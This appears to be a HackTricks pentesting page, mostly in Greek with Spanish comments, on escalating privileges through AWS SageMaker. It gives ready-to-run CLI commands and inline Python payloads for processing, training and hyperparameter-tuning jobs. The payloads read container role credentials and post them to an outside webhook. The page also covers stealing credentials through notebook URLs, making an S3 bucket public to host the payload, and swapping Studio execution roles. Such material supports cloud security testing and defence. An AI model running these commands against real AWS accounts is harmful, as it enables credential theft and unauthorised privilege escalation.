# AWS - Sagemaker Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## AWS - Sagemaker Privesc

### `iam:PassRole` , `sagemaker:CreateNotebookInstance`, `sagemaker:CreatePresignedNotebookInstanceUrl`

Ξεκινήστε τη δημιουργία ενός notebook με το IAM Role επισυνάμενο σε αυτό:
```bash
aws sagemaker create-notebook-instance --notebook-instance-name example \
--instance-type ml.t2.medium \
--role-arn arn:aws:iam::<account-id>:role/service-role/<role-name>
```
Η απόκριση θα πρέπει να περιέχει ένα πεδίο `NotebookInstanceArn`, το οποίο θα περιέχει το ARN του νεοδημιουργημένου notebook instance. Στη συνέχεια μπορούμε να χρησιμοποιήσουμε το API `create-presigned-notebook-instance-url` για να δημιουργήσουμε ένα URL που μπορούμε να χρησιμοποιήσουμε για να αποκτήσουμε πρόσβαση στο notebook instance μόλις είναι έτοιμο:
```bash
aws sagemaker create-presigned-notebook-instance-url \
--notebook-instance-name <name>
```
Πλοηγηθείτε στη διεύθυνση URL με το πρόγραμμα περιήγησης και κάντε κλικ στο `Open JupyterLab`` επάνω δεξιά, στη συνέχεια μεταβείτε προς τα κάτω στην καρτέλα “Launcher” και κάτω από την ενότητα “Other”, κάντε κλικ στο κουμπί “Terminal”.

Τώρα μπορείτε να αποκτήσετε πρόσβαση στα metadata credentials του IAM Role.

**Potential Impact:** Privesc to the sagemaker service role specified.

### `sagemaker:CreatePresignedNotebookInstanceUrl`

Εάν υπάρχουν Jupyter **notebooks που τρέχουν ήδη** σε αυτό και μπορείτε να τα απαριθμήσετε με `sagemaker:ListNotebookInstances` (ή να τα εντοπίσετε με οποιονδήποτε άλλο τρόπο). Μπορείτε να **δημιουργήσετε ένα URL για αυτά, να αποκτήσετε πρόσβαση και να κλέψετε τα credentials όπως υποδεικνύεται στην προηγούμενη τεχνική**.
```bash
aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name <name>
```
**Potential Impact:** Privesc στον συνημμένο ρόλο υπηρεσίας sagemaker.

### `sagemaker:CreateProcessingJob`, `iam:PassRole`

Ένας επιτιθέμενος με αυτά τα δικαιώματα μπορεί να αναγκάσει το **SageMaker να εκτελέσει μια εργασία επεξεργασίας** με έναν ρόλο SageMaker συνημμένο σε αυτήν. Επαναχρησιμοποιώντας ένα από τα AWS Deep Learning Containers που ήδη περιέχουν Python (και εκτελώντας το job στην ίδια περιοχή με το URI), μπορείς να εκτελέσεις κώδικα inline χωρίς να κατασκευάσεις δικές σου εικόνες:
```bash
REGION=<region>
ROLE_ARN=<sagemaker-arn-role>
IMAGE=683313688378.dkr.ecr.$REGION.amazonaws.com/sagemaker-scikit-learn:1.2-1-cpu-py3
ENV='{"W":"https://example.com/webhook"}'

aws sagemaker create-processing-job \
--processing-job-name privescjob \
--processing-resources '{"ClusterConfig":{"InstanceCount":1,"InstanceType":"ml.t3.medium","VolumeSizeInGB":50}}' \
--app-specification "{\"ImageUri\":\"$IMAGE\",\"ContainerEntrypoint\":[\"python\",\"-c\"],\"ContainerArguments\":[\"import os,urllib.request as u;m=os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI');m and u.urlopen(os.environ['W'],data=u.urlopen('http://169.254.170.2'+m).read())\"]}" \
--environment "$ENV" \
--role-arn $ROLE_ARN

# Las credenciales llegan al webhook indicado. Asegúrate de que el rol tenga permisos ECR (AmazonEC2ContainerRegistryReadOnly) para descargar la imagen.
```
**Πιθανός Αντίκτυπος:** Privesc to the sagemaker service role specified.

### `sagemaker:CreateTrainingJob`, `iam:PassRole`

Ένας επιτιθέμενος με αυτά τα δικαιώματα μπορεί να ξεκινήσει ένα training job που εκτελεί αυθαίρετο κώδικα με το καθορισμένο role. Χρησιμοποιώντας ένα επίσημο container του SageMaker και υπεργράφοντας το entrypoint με ένα inline payload, δεν χρειάζεται να δημιουργήσεις δικές σου images:
```bash
REGION=<region>
ROLE_ARN=<sagemaker-role-to-abuse>
IMAGE=763104351884.dkr.ecr.$REGION.amazonaws.com/pytorch-training:2.1-cpu-py310
ENV='{"W":"https://example.com/webhook"}'
OUTPUT_S3=s3://<existing-bucket>/training-output/
# El rol debe poder leer imágenes de ECR (p.e. AmazonEC2ContainerRegistryReadOnly) y escribir en OUTPUT_S3.

aws sagemaker create-training-job \
--training-job-name privesc-train \
--role-arn $ROLE_ARN \
--algorithm-specification "{\"TrainingImage\":\"$IMAGE\",\"TrainingInputMode\":\"File\",\"ContainerEntrypoint\":[\"python\",\"-c\"],\"ContainerArguments\":[\"import os,urllib.request as u;m=os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI');m and u.urlopen(os.environ['W'],data=u.urlopen('http://169.254.170.2'+m).read())\"]}" \
--output-data-config "{\"S3OutputPath\":\"$OUTPUT_S3\"}" \
--resource-config '{"InstanceCount":1,"InstanceType":"ml.m5.large","VolumeSizeInGB":50}' \
--stopping-condition '{"MaxRuntimeInSeconds":600}' \
--environment "$ENV"

# El payload se ejecuta en cuanto el job pasa a InProgress y exfiltra las credenciales del rol.
```
**Potential Impact:** Privesc στον συγκεκριμένο ρόλο υπηρεσίας του SageMaker.

### `sagemaker:CreateHyperParameterTuningJob`, `iam:PassRole`

Ένας attacker με αυτά τα δικαιώματα μπορεί να ξεκινήσει ένα HyperParameter Tuning Job που εκτελεί attacker-controlled code υπό τον παρεχόμενο ρόλο. Το Script mode απαιτεί τη φιλοξενία του payload στο S3, αλλά όλα τα βήματα μπορούν να αυτοματοποιηθούν από το CLI:
```bash
REGION=<region>
ROLE_ARN=<sagemaker-role-to-abuse>
BUCKET=sm-hpo-privesc-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION

# Allow public reads so any SageMaker role can pull the code
aws s3api put-public-access-block \
--bucket $BUCKET \
--public-access-block-configuration '{
"BlockPublicAcls": false,
"IgnorePublicAcls": false,
"BlockPublicPolicy": false,
"RestrictPublicBuckets": false
}'

aws s3api put-bucket-policy --bucket $BUCKET --policy "{
\"Version\": \"2012-10-17\",
\"Statement\": [
{
\"Effect\": \"Allow\",
\"Principal\": \"*\",
\"Action\": \"s3:GetObject\",
\"Resource\": \"arn:aws:s3:::$BUCKET/*\"
}
]
}"

cat <<'EOF' > /tmp/train.py
import os, time, urllib.request

def main():
meta = os.environ.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI")
if not meta:
return
creds = urllib.request.urlopen(f"http://169.254.170.2{meta}").read()
req = urllib.request.Request(
"https://example.com/webhook",
data=creds,
headers={"Content-Type": "application/json"}
)
urllib.request.urlopen(req)
print("train:loss=0")
time.sleep(300)

if __name__ == "__main__":
main()
EOF

cd /tmp
tar -czf code.tar.gz train.py
aws s3 cp code.tar.gz s3://$BUCKET/code/train-code.tar.gz --region $REGION --acl public-read

echo "dummy" > /tmp/input.txt
aws s3 cp /tmp/input.txt s3://$BUCKET/input/dummy.txt --region $REGION --acl public-read

IMAGE=763104351884.dkr.ecr.$REGION.amazonaws.com/pytorch-training:2.1-cpu-py310
CODE_S3=s3://$BUCKET/code/train-code.tar.gz
TRAIN_INPUT_S3=s3://$BUCKET/input
OUTPUT_S3=s3://$BUCKET/output
# El rol necesita permisos ECR y escritura en el bucket.

cat > /tmp/hpo-definition.json <<EOF
{
"AlgorithmSpecification": {
"TrainingImage": "$IMAGE",
"TrainingInputMode": "File",
"MetricDefinitions": [{"Name": "train:loss", "Regex": "train:loss=([0-9.]+)"}]
},
"StaticHyperParameters": {
"sagemaker_program": "train.py",
"sagemaker_submit_directory": "$CODE_S3"
},
"RoleArn": "$ROLE_ARN",
"InputDataConfig": [
{
"ChannelName": "training",
"DataSource": {
"S3DataSource": {
"S3DataType": "S3Prefix",
"S3Uri": "$TRAIN_INPUT_S3",
"S3DataDistributionType": "FullyReplicated"
}
}
}
],
"OutputDataConfig": {
"S3OutputPath": "$OUTPUT_S3"
},
"ResourceConfig": {
"InstanceType": "ml.m5.large",
"InstanceCount": 1,
"VolumeSizeInGB": 50
},
"StoppingCondition": {
"MaxRuntimeInSeconds": 600
}
}
EOF

aws sagemaker create-hyper-parameter-tuning-job \
--hyper-parameter-tuning-job-name privesc-hpo \
--hyper-parameter-tuning-job-config '{"Strategy":"Random","ResourceLimits":{"MaxNumberOfTrainingJobs":1,"MaxParallelTrainingJobs":1},"HyperParameterTuningJobObjective":{"Type":"Maximize","MetricName":"train:loss"}}' \
--training-job-definition file:///tmp/hpo-definition.json
```
Κάθε training που εκκινείται από τη διαδικασία τυπώνει τη μετρική και εξάγει τα credentials του συγκεκριμένου role.


### `sagemaker:UpdateUserProfile`/`UpdateSpace`/`UpdateDomain` Studio role swap (no `iam:PassRole`)

Προτεραιότητα του ExecutionRole:

- `UserProfile` αντικαθιστά οποιαδήποτε τιμή. Αν ένα προφίλ ορίζει το `ExecutionRole`, το Studio θα χρησιμοποιήσει πάντα αυτό το role.
- `Space` εφαρμόζεται μόνο όταν το προφίλ δεν έχει δικό του role· διαφορετικά υπερισχύει αυτό του προφίλ.
- `Domain DefaultUserSettings` λειτουργεί ως έσχατη λύση όταν ούτε το `UserProfile` ούτε το `Space` ορίζουν role.

Με δικαιώματα για ενημέρωση (update) ενός SageMaker Studio User Profile (ή Space/Domain), ένας attacker μπορεί να ορίσει το `ExecutionRole` σε οποιοδήποτε IAM role που το SageMaker service principal μπορεί να αναλάβει. Σε αντίθεση με τις job-creation APIs, οι Studio profile update APIs δεν απαιτούν `iam:PassRole`. Νέες Studio apps που εκκινούν για αυτό το profile θα τρέξουν με το swapped role, παρέχοντας interactive elevated permissions μέσω Jupyter terminals ή μέσω jobs που ξεκινούν από το Studio.

Βήματα:
```bash
# 1) List Studio user profiles and pick a target
aws sagemaker list-user-profiles --domain-id-equals <DOMAIN_ID>

# Choose a more-privileged role that already trusts sagemaker.amazonaws.com
ROLE_ARN=arn:aws:iam::<ACCOUNT_ID>:role/<HighPrivSageMakerExecutionRole>

# 2) Update the Studio profile to use the new role (no iam:PassRole)
aws sagemaker update-user-profile \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--user-settings ExecutionRole=$ROLE_ARN

aws sagemaker describe-user-profile \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--query 'UserSettings.ExecutionRole' --output text

# 3) If the tenant uses Studio Spaces, swap the ExecutionRole at the space level
aws sagemaker update-space \
--domain-id <DOMAIN_ID> \
--space-name <SPACE> \
--space-settings ExecutionRole=$ROLE_ARN

aws sagemaker describe-space \
--domain-id <DOMAIN_ID> \
--space-name <SPACE> \
--query 'SpaceSettings.ExecutionRole' --output text

# 4) Optionally, change the domain default so every profile inherits the new role
aws sagemaker update-domain \
--domain-id <DOMAIN_ID> \
--default-user-settings ExecutionRole=$ROLE_ARN

aws sagemaker describe-domain \
--domain-id <DOMAIN_ID> \
--query 'DefaultUserSettings.ExecutionRole' --output text

# 5) Launch a JupyterServer app (or generate a presigned URL) so new sessions assume the swapped role
aws sagemaker create-app \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--app-type JupyterServer \
--app-name js-atk

# Optional: create a presigned Studio URL and, inside a Jupyter terminal, run:
#    aws sts get-caller-identity  # should reflect the new ExecutionRole
aws sagemaker create-presigned-domain-url \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--query AuthorizedUrl --output text
```
**Ενδεχόμενο Αντίκτυπο**: Privilege escalation στα δικαιώματα του καθορισμένου SageMaker execution role για interactive Studio sessions.


## Αναφορές

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)


{{#include ../../../../banners/hacktricks-training.md}}
